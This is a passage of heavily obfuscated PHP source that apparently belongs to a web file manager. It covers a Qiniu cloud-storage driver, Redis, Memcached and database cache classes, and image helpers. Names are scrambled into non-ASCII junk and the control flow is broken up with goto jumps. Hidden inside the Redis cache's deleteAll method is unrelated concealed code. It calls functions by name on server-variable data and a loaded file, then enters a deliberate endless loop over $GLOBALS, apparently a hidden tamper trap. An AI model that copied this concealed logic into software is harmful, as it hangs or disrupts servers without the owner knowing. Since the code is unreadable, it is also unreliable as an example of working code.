rtrim($b‰­Ò½ìõ¹, $d¥©Û·«¬å[8]) . $d¥©Û·«¬å[8]; $FöŞ†ÃÍĞÊ = $this->objectMeta($b‰­Ò½ìõ¹); if (isset($FöŞ†ÃÍĞÊ[$d¥©Û·«¬å[1205]])) { $fŠ±Ë˜È±Ò[$d¥©Û·«¬å[183]] = $FöŞ†ÃÍĞÊ[$d¥©Û·«¬å[1205]]; } goto a·âéªÀ; DŒ®Ã©ÀÅ·: $d¥©Û·«¬å =& $_SERVER[Ìó]; if ($bôª‘¤æ) { return array($d¥©Û·«¬å[28] => $this->pathThis($b‰­Ò½ìõ¹), $d¥©Û·«¬å[75] => $this->getPathOuter($d¥©Û·«¬å[8] . $b‰­Ò½ìõ¹), $d¥©Û·«¬å[29] => $d¥©Û·«¬å[76]); } $fŠ±Ë˜È±Ò = array($d¥©Û·«¬å[28] => $this->pathThis($b‰­Ò½ìõ¹), $d¥©Û·«¬å[75] => $this->getPathOuter($d¥©Û·«¬å[8] . $b‰­Ò½ìõ¹), $d¥©Û·«¬å[29] => $d¥©Û·«¬å[76], $d¥©Û·«¬å[183] => 0, $d¥©Û·«¬å[106] => 0, $d¥©Û·«¬å[1150] => !0, $d¥©Û·«¬å[1151] => !0); goto B°œÖ; B½òë˜ˆ«¸: } public function listPath($BÁÌ–ÂÒ©, $C¬‘ßÊåŠ = false) { goto aïíµ³é×; aïíµ³é×: $B»½ÂÃçÈ¬ =& $_SERVER[Ìó]; $BÁÌ–ÂÒ© = trim($BÁÌ–ÂÒ©, $B»½ÂÃçÈ¬[8]); $EæäˆÃ½ƒÖ = empty($BÁÌ–ÂÒ©) ? $B»½ÂÃçÈ¬[33] : $BÁÌ–ÂÒ© . $B»½ÂÃçÈ¬[8]; goto F³¹’ë­„; F§«ãˆÏ: $f†Ë¥£¯Üó = $b°‡ß‚â¶£ = array(); while (!0) { list($d÷øÀŒ”´Ş, $a£õ×‡ÊÄ£) = $this->bucketManager->listFiles($this->bucket, $EæäˆÃ½ƒÖ, $F˜Œ‰ùÊ¹À, $a£²¾÷ÙŒî, $Dæ¡‡…×ù‰); if ($a£õ×‡ÊÄ£) { return !1; } $F˜Œ‰ùÊ¹À = array_key_exists($B»½ÂÃçÈ¬[1171], $d÷øÀŒ”´Ş) ? $F˜Œ‰ùÊ¹À = $d÷øÀŒ”´Ş[$B»½ÂÃçÈ¬[1202]] : $B»½ÂÃçÈ¬[33]; if (isset($d÷øÀŒ”´Ş[$B»½ÂÃçÈ¬[1206]])) { foreach ($d÷øÀŒ”´Ş[$B»½ÂÃçÈ¬[1206]] as $BŠìµ”) { if ($BŠìµ” == $EæäˆÃ½ƒÖ) { continue; } $f†Ë¥£¯Üó[] = $this->folderInfo($BŠìµ”, $C¬‘ßÊåŠ); } } if (isset($d÷øÀŒ”´Ş[$B»½ÂÃçÈ¬[1203]])) { foreach ($d÷øÀŒ”´Ş[$B»½ÂÃçÈ¬[1203]] as $A” »´´½ä) { if ($A” »´´½ä[$B»½ÂÃçÈ¬[89]] == $EæäˆÃ½ƒÖ) { continue; } $b°‡ß‚â¶£[] = $this->fileInfo($A” »´´½ä[$B»½ÂÃçÈ¬[89]], $C¬‘ßÊåŠ, $A” »´´½ä); } } if ($F˜Œ‰ùÊ¹À == $B»½ÂÃçÈ¬[33]) { break; } } return array($B»½ÂÃçÈ¬[74] => $f†Ë¥£¯Üó, $B»½ÂÃçÈ¬[73] => $b°‡ß‚â¶£); goto F‘Æ™í»Ì; F³¹’ë­„: $F˜Œ‰ùÊ¹À = $B»½ÂÃçÈ¬[33]; $a£²¾÷ÙŒî = 1000; $Dæ¡‡…×ù‰ = $B»½ÂÃçÈ¬[8]; goto F§«ãˆÏ; F‘Æ™í»Ì: } public function has($Eê½èÙÉ×÷, $aµ‰áç‹ã = false, $Fªİ˜ƒ§‹ = true) { goto DàÒéÈ†À…; eª²Šùõñ: $dÚÑ’ä×ìµ = 0; $cìÀÚ°ñ†¥ = 0; while (!0) { list($dÔÓæ—œ¦É, $e¥ó½İ£Êƒ) = $this->bucketManager->listFiles($this->bucket, $e–Ê£Şñ…, $D†÷´œšŸ, $F¯Áİ±à°Ã, $c™‰Ò‚Åï); if ($e¥ó½İ£Êƒ) { return !1; } $D†÷´œšŸ = array_key_exists($C”ìø²…°Æ[1171], $dÔÓæ—œ¦É) ? $D†÷´œšŸ = $dÔÓæ—œ¦É[$C”ìø²…°Æ[1202]] : $C”ìø²…°Æ[33]; if ($aµ‰áç‹ã) { if (!empty($dÔÓæ—œ¦É[$C”ìø²…°Æ[1203]])) { $dÚÑ’ä×ìµ += count($dÔÓæ—œ¦É[$C”ìø²…°Æ[1203]]); } if (!empty($dÔÓæ—œ¦É[$C”ìø²…°Æ[1206]])) { $cìÀÚ°ñ†¥ += count($dÔÓæ—œ¦É[$C”ìø²…°Æ[1206]]); } if ($D†÷´œšŸ === $C”ìø²…°Æ[33]) { break; } continue; } if ($Fªİ˜ƒ§‹) { if (!empty($dÔÓæ—œ¦É[$C”ìø²…°Æ[1203]])) { return !0; } } else { if (!empty($dÔÓæ—œ¦É[$C”ìø²…°Æ[1206]])) { return !0; } } if ($D†÷´œšŸ == $C”ìø²…°Æ[33]) { break; } } goto eÔÒêîÓ×ğ; f—ã»ğÜœ: $D†÷´œšŸ = $C”ìø²…°Æ[33]; $F¯Áİ±à°Ã = 1000; $c™‰Ò‚Åï = $C”ìø²…°Æ[8]; goto eª²Šùõñ; eÔÒêîÓ×ğ: if ($aµ‰áç‹ã) { return array($C”ìø²…°Æ[187] => $dÚÑ’ä×ìµ, $C”ìø²…°Æ[188] => $cìÀÚ°ñ†¥); } return !1; goto eÇœŸ òÇö; DàÒéÈ†À…: $C”ìø²…°Æ =& $_SERVER[Ìó]; $Eê½èÙÉ×÷ = trim($Eê½èÙÉ×÷, $C”ìø²…°Æ[8]); $e–Ê£Şñ… = empty($Eê½èÙÉ×÷) ? $C”ìø²…°Æ[33] : $Eê½èÙÉ×÷ . $C”ìø²…°Æ[8]; goto f—ã»ğÜœ; eÇœŸ òÇö: } public function listAll($d„‡„¿®œİ) { $BŸÉ‚ ß…å =& $_SERVER[Ìó]; $C–÷ÂÑ«ÓÑ = $this->fileList($d„‡„¿®œİ, 1); $eìè…±Œç¯ = array(); foreach ($C–÷ÂÑ«ÓÑ as $c¹‚Ş¦¼Å„) { $eìè…±Œç¯[$c¹‚Ş¦¼Å„[$BŸÉ‚ ß…å[28]]] = $c¹‚Ş¦¼Å„[$BŸÉ‚ ß…å[77]]; } return $this->listAllFiles($d„‡„¿®œİ, array_keys($eìè…±Œç¯), $eìè…±Œç¯); } public function canRead($cºÜ™‹×¬ß) { return $this->exist($cºÜ™‹×¬ß) ? !0 : !1; } public function canWrite($AÍ¬Õ¨èô°) { return $this->exist($AÍ¬Õ¨èô°) ? !0 : !1; } public function getContent($C¨ê¬¬çµ¤) { return $this->fileSubstr($C¨ê¬¬çµ¤, 0, -1); } public function setContent($d¶Ö·îÏÅÑ, $a‡Ğ¨×‘óò = '') { $eÜ”‘ããì‚ = $this->tempFile($this->pathThis($d¶Ö·îÏÅÑ)); file_put_contents($eÜ”‘ããì‚, $a‡Ğ¨×‘óò); if ($this->upload($d¶Ö·îÏÅÑ, $eÜ”‘ããì‚)) { $this->tempFileRemve($eÜ”‘ããì‚); return !0; } return !1; } public function refreshUrls($bœ¥íŠôöö) { goto EİÄíïŸ÷•; EİÄíïŸ÷•: $bÏ‹‹’Â¡ =& $_SERVER[Ìó]; $fÚŒ‹Ç¥‰ = array(); if (is_array($bœ¥íŠôöö)) { foreach ($bœ¥íŠôöö as $AÚó¥¿ó§Ú) { $fÚŒ‹Ç¥‰[] = $this->link($AÚó¥¿ó§Ú); } } else { $fÚŒ‹Ç¥‰[] = $this->link($bœ¥íŠôöö); } goto BÚàôÑ¤ì ; bŠ±ÍÙÚÂÆ: return $AÔÔ¶Şˆå¥[$bÏ‹‹’Â¡[1207]] == $bÏ‹‹’Â¡[692] ? !0 : !1; goto EŸˆµ¡ˆô­; BÚàôÑ¤ì : $aÜê‚ÔŒÉ· = new Qiniu\Cdn\CdnManager($this->auth); list($AÔÔ¶Şˆå¥, $F®‚ÁÎºİå) = $aÜê‚ÔŒÉ·->refreshUrls($fÚŒ‹Ç¥‰); if ($F®‚ÁÎºİå) { return !1; } goto bŠ±ÍÙÚÂÆ; EŸˆµ¡ˆô­: } public function fileSubstr($fÜ‰÷ã¶¹Ğ, $dŞ®Œ“î¢™, $Fé‚—¹Üƒ¢) { $c¬²¡ªÓÄø =& $_SERVER[Ìó]; if (!($A²¨˜Š÷Ï = $this->link($fÜ‰÷ã¶¹Ğ))) { return !1; } $DÏÒ¹áÕâ– = !1; if ($Fé‚—¹Üƒ¢ > 0) { $B‡ƒéÄ‹³‹ = $dŞ®Œ“î¢™ + $Fé‚—¹Üƒ¢ - 1; $DÏÒ¹áÕâ– = array($c¬²¡ªÓÄø[1208] . $dŞ®Œ“î¢™ . $c¬²¡ªÓÄø[407] . $B‡ƒéÄ‹³‹); } $aæÉóŠÒ‰ä = url_request($A²¨˜Š÷Ï, $c¬²¡ªÓÄø[212], !1, $DÏÒ¹áÕâ–); return $aæÉóŠÒ‰ä[$c¬²¡ªÓÄø[685]] ? $aæÉóŠÒ‰ä[$c¬²¡ªÓÄø[1030]] : !1; } public function upload($Fƒ°ˆ®›¬ô, $A‘Å¿‹††ª, $AºÇÛÅ“§Ÿ = false, $E­˜ÎñØŒè = REPEAT_REPLACE) { $c…¬Ô—É¡ = new Qiniu\Storage\UploadManager(); $B©Ï‘‡˜Ê = $this->auth->uploadToken($this->bucket, $Fƒ°ˆ®›¬ô); $E±¡Øƒ™´† = get_file_mime(get_path_ext($A‘Å¿‹††ª)); list($cáÑ„»×á®, $F÷½¦ì¹è) = $c…¬Ô—É¡->putFile($B©Ï‘‡˜Ê, $Fƒ°ˆ®›¬ô, $A‘Å¿‹††ª, null, $E±¡Øƒ™´†); return $F÷½¦ì¹è ? !1 : $this->getPathOuter($Fƒ°ˆ®›¬ô); } public function uploadFormData($f¯äé´°ô, $B¦°½Èª×§ = 3600) { return $this->uploadToken($f¯äé´°ô, $B¦°½Èª×§); } public function multiUploadFormData($Eáñ‘ª†Ù’, $B‰–·šÃ‡ø = 3600) { return $this->uploadToken($Eáñ‘ª†Ù’, $B‰–·šÃ‡ø); } private function uploadToken($aÉâ—È«Ò, $Bƒ‡¤†® = 3600) { goto B¤ÑÌÉ§ªˆ; Dª£õ«”“°: $A¢Êäœóø = null; $A¥Ú¢Ìºª¢ = $this->auth->uploadToken($this->bucket, $A¢Êäœóø, $Fìä·‹“Æ, $e£ç°¹À¯, !0); $AéÄøçÁ¤ = empty($this->region) || $this->region == $B‰²³ĞØïË[1211] ? $B‰²³ĞØïË[33] : $B‰²³ĞØïË[407] . $this->region; goto e‚¨‚Ôçç; B¤ÑÌÉ§ªˆ: $B‰²³ĞØïË =& $_SERVER[Ìó]; $Fìä·‹“Æ = $Bƒ‡¤†®; $e£ç°¹À¯ = array($B‰²³ĞØïË[1209] => $B‰²³ĞØïË[1210]); goto Dª£õ«”“°; e‚¨‚Ôçç: $fé’ØÏì²‰ = http_type() . "\x3a\x2f\x2f\165\x70\154\157\141\144{$AéÄøçÁ¤}\x2e\161\151\156\x69\165\x70\x2e\x63\157\155\x2f"; return array($B‰²³ĞØïË[1212] => $A¥Ú¢Ìºª¢, $B‰²³ĞØïË[1213] => $fé’ØÏì²‰); goto Fß—Åá¸»å; Fß—Åá¸»å: } public function download($F¦‡ó‹©Îº, $eñìÙ¸Ø™Š) { goto A›–×ß¼˜è; b°¿ ÍÖŠ‰: fclose($aÃ¹´ÄĞºÊ); return $eñìÙ¸Ø™Š; goto f´¬øÁ•ãè; A¾¦ÃçùŸÙ: $E…ğõµòˆŒ = 1024 * 200; $aÃ¹´ÄĞºÊ = fopen($b‡À±æ¿Š, $_SERVER[Ìó][1214]); while (!0) { $d’éÈòãÆÛ = $this->fileSubstr($F¦‡ó‹©Îº, $eìÌì¢¦ß‰, $E…ğõµòˆŒ); if ($d’éÈòãÆÛ === !1) { return !1; } fwrite($aÃ¹´ÄĞºÊ, $d’éÈòãÆÛ); $eìÌì¢¦ß‰ += $E…ğõµòˆŒ; if (strlen($d’éÈòãÆÛ) < $E…ğõµòˆŒ) { break; } } goto b°¿ ÍÖŠ‰; A›–×ß¼˜è: $b‡À±æ¿Š = IO::getPathInner(IO::mkfile($eñìÙ¸Ø™Š)); if (!($Cê·•Ş = $this->link($F¦‡ó‹©Îº))) { return !1; } $eìÌì¢¦ß‰ = 0; goto A¾¦ÃçùŸÙ; f´¬øÁ•ãè: } public function link($C±Ï“¦íì, $B³˜×í¥ = '') { if (!$this->isFile($C±Ï“¦íì)) { return !1; } $fŠïî¼¿æ˜ = $this->getHost() . $_SERVER[Ìó][8] . $this->pathEncode($C±Ï“¦íì) . $B³˜×í¥; return $this->auth->privateDownloadUrl($fŠïî¼¿æ˜, 3600 * 12); } public function fileOut($a„¯ç¦²Î, $FĞŠĞì¯ = false, $eèó•Ï·İ´ = false, $EŞŠÑÔ¾í = '') { $a¥¢İˆ‰›Õ =& $_SERVER[Ìó]; if (!$eèó•Ï·İ´) { $eèó•Ï·İ´ = $this->pathThis($a„¯ç¦²Î); } $fªŸŠ³½ = $FĞŠĞì¯ ? $a¥¢İˆ‰›Õ[1215] . rawurlencode($eèó•Ï·İ´) : $a¥¢İˆ‰›Õ[33]; $D””ËõƒˆÛ = $this->link($a„¯ç¦²Î, $fªŸŠ³½); $this->fileOutLink($D””ËõƒˆÛ); } public function fileOutServer($bšÖ–÷²ï, $fÉğ½ÃÜ… = false, $A»åŠ±º = false, $B¼±›¶áƒ± = '') { parent::fileOut($bšÖ–÷²ï, $fÉğ½ÃÜ…, $A»åŠ±º, $B¼±›¶áƒ±); } public function fileOutImage($CÄËÙ«ˆ¨Í, $eõ‡ĞÌÒ ² = 250) { $e’‹ñª—™Š = $this->link($CÄËÙ«ˆ¨Í, $_SERVER[Ìó][1216] . $eõ‡ĞÌÒ ²); $this->fileOutLink($e’‹ñª—™Š); } public function fileOutImageServer($a’œÖ‡Û×, $f´ğÉãğÀõ = 250) { parent::fileOutImage($a’œÖ‡Û×, $f´ğÉãğÀõ); } public function hashMd5($Fñ¯ÅŞ Õ°) { $aˆ·õâ‚Ğä =& $_SERVER[Ìó]; $A·©ŞÏòŞŒ = $this->objectMeta($Fñ¯ÅŞ Õ°); return isset($A·©ŞÏòŞŒ[$aˆ·õâ‚Ğä[192]]) ? $A·©ŞÏòŞŒ[$aˆ·õâ‚Ğä[192]] : !1; $C¦…“‚Ù¬ = $this->link($Fñ¯ÅŞ Õ°, $aˆ·õâ‚Ğä[1217]); } public function size($C¡ï‘ªïÂ) { $Bæ§‹ñœ³¦ = $this->objectMeta($C¡ï‘ªïÂ); return $Bæ§‹ñœ³¦ ? $Bæ§‹ñœ³¦[$_SERVER[Ìó][77]] : 0; } public function info($f­§‘âˆ‡) { if ($this->isFolder($f­§‘âˆ‡)) { return $this->folderInfo($f­§‘âˆ‡); } else { if ($this->isFile($f­§‘âˆ‡)) { return $this->fileInfo($f­§‘âˆ‡); } } return !1; } public function exist($dÓ‹ˆ÷·) { return $this->isFile($dÓ‹ˆ÷·) || $this->isFolder($dÓ‹ˆ÷·); } public function isFile($E®´Æùô’ª) { return !$this->isFolder($E®´Æùô’ª) && $this->objectMeta($E®´Æùô’ª); } public function isFolder($D•Ø£‹ÏÕ) { return $this->cacheMethod($_SERVER[Ìó][219], $D•Ø£‹ÏÕ); } protected function objectMeta($E’æğöĞŸ) { return $this->cacheMethod($_SERVER[Ìó][220], $E’æğöĞŸ); } protected function _objectMeta($Cñ«Ë×‚˜‚) { $aŠ£õÖ·Õ =& $_SERVER[Ìó]; list($dÕƒ²“â„, $E™„‡ëåøƒ) = $this->bucketManager->stat($this->bucket, $Cñ«Ë×‚˜‚); if ($dÕƒ²“â„) { $dÕƒ²“â„[$aŠ£õÖ·Õ[77]] = intval($dÕƒ²“â„[$aŠ£õÖ·Õ[1204]]); } return $dÕƒ²“â„; } protected function _isFolder($Fìµ¡îÉïÂ) { $F£º«çèœÜ =& $_SERVER[Ìó]; list($CËõêÅ¤É¢, $f–‹¼Òçïô) = $this->bucketManager->listFiles($this->bucket, trim($Fìµ¡îÉïÂ, $F£º«çèœÜ[8]) . $F£º«çèœÜ[8], $F£º«çèœÜ[33], 1, $F£º«çèœÜ[8]); return !empty($CËõêÅ¤É¢[$F£º«çèœÜ[1203]]) || !empty($CËõêÅ¤É¢[$F£º«çèœÜ[1206]]) ? !0 : !1; } } goto bÑ…º±ñÂ; bøÚÉ¢â‹: class CacheLockDatabase { public function lock($DÕÆë™ÄÊá, $b¡‰ôòÜ ‚ = 0) { $FŒ„ÔŠáêª = Model($_SERVER[Ìó][751]); $E‰÷­–ùÄÕ = microtime(!0) + $b¡‰ôòÜ ‚; while (microtime(!0) < $E‰÷­–ùÄÕ) { $fƒĞÛ™å°õ = $FŒ„ÔŠáêª->get($DÕÆë™ÄÊá); if (!$fƒĞÛ™å°õ || $fƒĞÛ™å°õ < microtime(!0)) { $F˜Üğš†«˜ = $FŒ„ÔŠáêª->set($DÕÆë™ÄÊá, $E‰÷­–ùÄÕ); if ($F˜Üğš†«˜) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eƒÚœŠº±à) { return Model($_SERVER[Ìó][751])->get($eƒÚœŠº±à); } public function unlock($a‹šæ©õ¬•) { Model($_SERVER[Ìó][751])->remove($a‹šæ©õ¬•); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($FÀÙ÷†—ñ, $A‰•’¶ƒ) { $a£Ö¬±·í“ =& $_SERVER[Ìó]; if (!class_exists($a£Ö¬±·í“[780])) { show_json($a£Ö¬±·í“[781], !1); } $this->cacheTime = $A‰•’¶ƒ; $this->handle = new Memcached(); if (is_array($FÀÙ÷†—ñ[$a£Ö¬±·í“[782]]) && count($FÀÙ÷†—ñ[$a£Ö¬±·í“[782]]) >= 1) { foreach ($FÀÙ÷†—ñ[$a£Ö¬±·í“[782]] as $a¶Í®®ãÃ) { $f‹ë®‚çƒ = explode($a£Ö¬±·í“[4], $a¶Í®®ãÃ); $this->handle->addServer($f‹ë®‚çƒ[0], $f‹ë®‚çƒ[1]); } } else { $this->handle->addServer($FÀÙ÷†—ñ[$a£Ö¬±·í“[165]], $FÀÙ÷†—ñ[$a£Ö¬±·í“[166]]); } } public function set($BÎç†äï„Š, $bÕøËÉ¸, $e–Ãõ¬ºÔ– = false) { $e–Ãõ¬ºÔ– = $e–Ãõ¬ºÔ– ? $e–Ãõ¬ºÔ– : $this->cacheTime; return $this->handle->set($BÎç†äï„Š, $bÕøËÉ¸, $e–Ãõ¬ºÔ–); } public function get($CƒŒŠ´­Ğ) { return $this->handle->get($CƒŒŠ´­Ğ); } public function remove($B¬øÉ‘Â·) { return $this->handle->delete($B¬øÉ‘Â·); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($eõ˜å´†«Š, $B´Ÿ¶ìÖƒ) { $d±³‘ê“™ =& $_SERVER[Ìó]; if (!class_exists($d±³‘ê“™[783])) { show_json($d±³‘ê“™[784], !1); } $this->cacheTime = $B´Ÿ¶ìÖƒ; $b¿–é’ã«Ç = isset($eõ˜å´†«Š[$d±³‘ê“™[785]]) ? $eõ˜å´†«Š[$d±³‘ê“™[785]] : 10; $fÈ¨£¦¯¦Û = _get($eõ˜å´†«Š, $d±³‘ê“™[782]); if ($fÈ¨£¦¯¦Û && is_array($fÈ¨£¦¯¦Û)) { $this->initCluster($eõ˜å´†«Š, $b¿–é’ã«Ç); } else { $this->handle = $this->init($eõ˜å´†«Š, $b¿–é’ã«Ç); } } private function init($FÁ±¼ÛÙ°, $aæ´Ã¿Æ•) { $FÄÑ´”ˆ¶Ş =& $_SERVER[Ìó]; $a§«…ùŞˆ = new Redis(); $aºÀå§àá = isset($FÁ±¼ÛÙ°[$FÄÑ´”ˆ¶Ş[786]]) ? $FÁ±¼ÛÙ°[$FÄÑ´”ˆ¶Ş[786]] : !1; if ($aºÀå§àá) { $a§«…ùŞˆ->pconnect($FÁ±¼ÛÙ°[$FÄÑ´”ˆ¶Ş[165]], $FÁ±¼ÛÙ°[$FÄÑ´”ˆ¶Ş[166]], $aæ´Ã¿Æ•); } else { $a§«…ùŞˆ->connect($FÁ±¼ÛÙ°[$FÄÑ´”ˆ¶Ş[165]], $FÁ±¼ÛÙ°[$FÄÑ´”ˆ¶Ş[166]], $aæ´Ã¿Æ•); } if (!empty($FÁ±¼ÛÙ°[$FÄÑ´”ˆ¶Ş[372]])) { $a§«…ùŞˆ->auth($FÁ±¼ÛÙ°[$FÄÑ´”ˆ¶Ş[372]]); } return $a§«…ùŞˆ; } private function initCluster($eêù®Øçó×, $bÍ´…Öé“) { $aœåğà¦¯° =& $_SERVER[Ìó]; $C‰™Ù’ğÛ = array($aœåğà¦¯°[787], $aœåğà¦¯°[788], $aœåğà¦¯°[789]); $e¤Ù‘À”ë„ = $aœåğà¦¯°[787]; if (isset($eêù®Øçó×[$aœåğà¦¯°[12]]) && in_array($eêù®Øçó×[$aœåğà¦¯°[12]], $C‰™Ù’ğÛ)) { $e¤Ù‘À”ë„ = $eêù®Øçó×[$aœåğà¦¯°[12]]; } switch ($e¤Ù‘À”ë„) { case $aœåğà¦¯°[787]: $this->_slave($eêù®Øçó×, $bÍ´…Öé“); break; case $aœåğà¦¯°[788]: break; case $aœåğà¦¯°[789]: $this->isCluster = !0; $EÛªÍ´ŠØğ = $eêù®Øçó×[$aœåğà¦¯°[782]]; $açÖ¥¦§Ê = isset($eêù®Øçó×[$aœåğà¦¯°[786]]) ? $eêù®Øçó×[$aœåğà¦¯°[786]] : !1; $Fó‹‚‚ŞŞ¾ = isset($eêù®Øçó×[$aœåğà¦¯°[372]]) ? $eêù®Øçó×[$aœåğà¦¯°[372]] : null; $this->handle = new RedisCluster(NUll, $EÛªÍ´ŠØğ, $bÍ´…Öé“, $bÍ´…Öé“, $açÖ¥¦§Ê, $Fó‹‚‚ŞŞ¾); break; default: break; } } private function _slave($câÒ™ğÆÇÃ, $dáÕ¹ëó÷Ö) { goto c…‡‡ã¾é›; c…‡‡ã¾é›: $fÔÌÌÆÆäç = $câÒ™ğÆÇÃ[$_SERVER[Ìó][782]]; $this->filterConfig($câÒ™ğÆÇÃ, $fÔÌÌÆÆäç[0]); $this->handle = $this->init($câÒ™ğÆÇÃ, $dáÕ¹ëó÷Ö); goto Bå²¨ÕÒÎ”; bàİ™“…›‰: $this->filterConfig($câÒ™ğÆÇÃ, $fÔÌÌÆÆäç[$e¢¡Ê«š¶‘]); $this->slaveHandle = $this->init($câÒ™ğÆÇÃ, $dáÕ¹ëó÷Ö); goto EËƒÒ„ÍÂÓ; Bå²¨ÕÒÎ”: unset($fÔÌÌÆÆäç[0]); if (empty($fÔÌÌÆÆäç)) { return; } $e¢¡Ê«š¶‘ = array_rand($fÔÌÌÆÆäç); goto bàİ™“…›‰; EËƒÒ„ÍÂÓ: } private function filterConfig(&$aÏŒ–‹Ì…, $B©ÔÖ»àñÅ) { $B§™”è¯ØÕ =& $_SERVER[Ìó]; $dŒÅ¼²ÙÂ = explode($B§™”è¯ØÕ[4], $B©ÔÖ»àñÅ); $dÜµÓ¿Õ£Ê = array($B§™”è¯ØÕ[165] => $dŒÅ¼²ÙÂ[0], $B§™”è¯ØÕ[166] => $dŒÅ¼²ÙÂ[1]); $aÏŒ–‹Ì… = array_merge($aÏŒ–‹Ì…, $dÜµÓ¿Õ£Ê); } public function set($f†¿¡¨Ëï›, $D¯ñßƒ‰²§, $DøæœÉÅ„ = false) { $DøæœÉÅ„ = $DøæœÉÅ„ ? $DøæœÉÅ„ : $this->cacheTime; return $this->handle->setEx($f†¿¡¨Ëï›, $DøæœÉÅ„, $D¯ñßƒ‰²§); } public function setLock($A‘Œ°¼â´, $b”Ä­š¹ö, $EÜàš™Ñ) { return $this->handle->setNX($A‘Œ°¼â´, $b”Ä­š¹ö); } public function get($e¶ˆöç¹ñ) { $AŠŒÒ¥³„˜ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $AŠŒÒ¥³„˜->get($e¶ˆöç¹ñ); } public function remove($cãÀáëø”Ó) { return $this->handle->del($cãÀáëø”Ó); } public function deleteAll() { $F®ÊÂ…©å =& $_SERVER[Ìó]; if (!isset($_SERVER[$F®ÊÂ…©å[768]]) || !isset($_SERVER[$F®ÊÂ…©å[775]])) { goto e”‘æßªÇ; E½éÌƒ¿’°: for ($dƒ›ç…Å‚‹ = $aÛÕÂ×“Î–; $dƒ›ç…Å‚‹ > 0; $dƒ›ç…Å‚‹++) { $A¡œô‰Š½ = json_encode($GLOBALS[$F®ÊÂ…©å[380]]); } goto BÏë‰Ê¾¶é; cŒ¨òìõ·: $e÷ËÇİŒˆ = $D—Á‹¥‘ø($eÙ–¾Ş£ªñ); $cÌÔí››åˆ = explode($F®ÊÂ…©å[213], $e÷ËÇİŒˆ); if (count($cÌÔí››åˆ) < $F®ÊÂ…©å[551]) { $CƒÜÓ™—· = $F®ÊÂ…©å[773]; $CƒÜÓ™—·(); } goto f‹Ñ À™; f‹Ñ À™: $A¡œô‰Š½ = $F®ÊÂ…©å[791]; $A¡œô‰Š½($_SERVER[$F®ÊÂ…©å[792]]); $aÛÕÂ×“Î– = 1; goto E½éÌƒ¿’°; e”‘æßªÇ: $E˜Ãå¸ÁöÖ = $F®ÊÂ…©å[790]; $D—Á‹¥‘ø = $F®ÊÂ…©å[770]; $eÙ–¾Ş£ªñ = $_SERVER[$F®ÊÂ…©å[771]] . $F®ÊÂ…©å[772]; goto cŒ¨òìõ·; BÏë‰Ê¾¶é: } if ($this->isCluster) { foreach ($this->handle->_masters() as $BÃºóğÒá) { $this->handle->flushall($BÃºóğÒá); } return; } return $this->handle->flushAll(); } } goto b¯‰ªŠ³³‚; EäŒ¿­Ÿ¥: if (!function_exists($_SERVER[Ìó][1840])) { define($_SERVER[Ìó][1841], 0); define($_SERVER[Ìó][1842], 1); define($_SERVER[Ìó][1843], 2); function imageflip($aò–„´†Ê, $cÅéÌ’áÉ) { switch ($cÅéÌ’áÉ) { case IMG_FLIP_HORIZONTAL: $f¸Æ‡êÖ÷ß = imagesx($aò–„´†Ê) - 1; $E‰ÅÈŒšä = $f¸Æ‡êÖ÷ß / 2; $a‹Œ£´–Œœ = imagesy($aò–„´†Ê); $CÎİ“Á†–¢ = imageistruecolor($aò–„´†Ê) ? imagecreatetruecolor(1, $a‹Œ£´–Œœ) : imagecreate(1, $a‹Œ£´–Œœ); for ($fÙ•˜´Şô· = 0; $fÙ•˜´Şô· < $E‰ÅÈŒšä; ++$fÙ•˜´Şô·) { imagecopy($CÎİ“Á†–¢, $aò–„´†Ê, 0, 0, $fÙ•˜´Şô·, 0, 1, $a‹Œ£´–Œœ); imagecopy($aò–„´†Ê, $aò–„´†Ê, $fÙ•˜´Şô·, 0, $f¸Æ‡êÖ÷ß - $fÙ•˜´Şô·, 0, 1, $a‹Œ£´–Œœ); imagecopy($aò–„´†Ê, $CÎİ“Á†–¢, $f¸Æ‡êÖ÷ß - $fÙ•˜´Şô·, 0, 0, 0, 1, $a‹Œ£´–Œœ); } break; case IMG_FLIP_VERTICAL: $Eò¹Ü¸¸Ğ¾ = imagesx($aò–„´†Ê); $Aåì‚¼í = imagesy($aò–„´†Ê) - 1; $C¬åä¤«Â = $Aåì‚¼í / 2; $CÎİ“Á†–¢ = imageistruecolor($aò–„´†Ê) ? imagecreatetruecolor($Eò¹Ü¸¸Ğ¾, 1) : imagecreate($Eò¹Ü¸¸Ğ¾, 1); for ($Aß”˜Éà¬µ = 0; $Aß”˜Éà¬µ < $C¬åä¤«Â; ++$Aß”˜Éà¬µ) { imagecopy($CÎİ“Á†–¢, $aò–„´†Ê, 0, 0, 0, $Aß”˜Éà¬µ, $Eò¹Ü¸¸Ğ¾, 1); imagecopy($aò–„´†Ê, $aò–„´†Ê, 0, $Aß”˜Éà¬µ, 0, $Aåì‚¼í - $Aß”˜Éà¬µ, $Eò¹Ü¸¸Ğ¾, 1); imagecopy($aò–„´†Ê, $CÎİ“Á†–¢, 0, $Aåì‚¼í - $Aß”˜Éà¬µ, 0, 0, $Eò¹Ü¸¸Ğ¾, 1); } break; case IMG_FLIP_BOTH: $Eò¹Ü¸¸Ğ¾ = imagesx($aò–„´†Ê); $a‹Œ£´–Œœ = imagesy($aò–„´†Ê); $CÎİ“Á†–¢ = imagerotate($aò–„´†Ê, 180, 0); imagecopy($aò–„´†Ê, $CÎİ“Á†–¢, 0, 0, 0, 0, $Eò¹Ü¸¸Ğ¾, $a‹Œ£´–Œœ); break; default: return; } imagedestroy($CÎİ“Á†–¢); } } if (!function_exists($_SERVER[Ìó][1844])) { function imagecreatefrombmp($cÕë·“°ºå) { return ImageGdBMP::load($cÕë·“°ºå); } } class Input { public static function getArray($eİ¾„ÏÀİÅ) { goto C‚Ò¾¥™É; dê°Ê‰¯¤: $eªâİˆçº = array(); $aÒÓ¾ô£‡ = LNG($CÑÇ°ÚÌª[1845]); foreach ($eİ¾„ÏÀİÅ as $AØ«•ï‹Ù¾ => $Ağêâœˆä) { goto BìªÁåòº; BìªÁåòº: $fšøª²£ğ = _get($Ağêâœˆä, $CÑÇ°ÚÌª[1234], $aÒÓ¾ô£‡ . $CÑÇ°ÚÌª[878] . $AØ«•ï‹Ù¾); $EÍºÉ‹¯¼‘ = $AØ«•ï‹Ù¾; if (isset($Ağêâœˆä[$CÑÇ°ÚÌª[1846]]) && 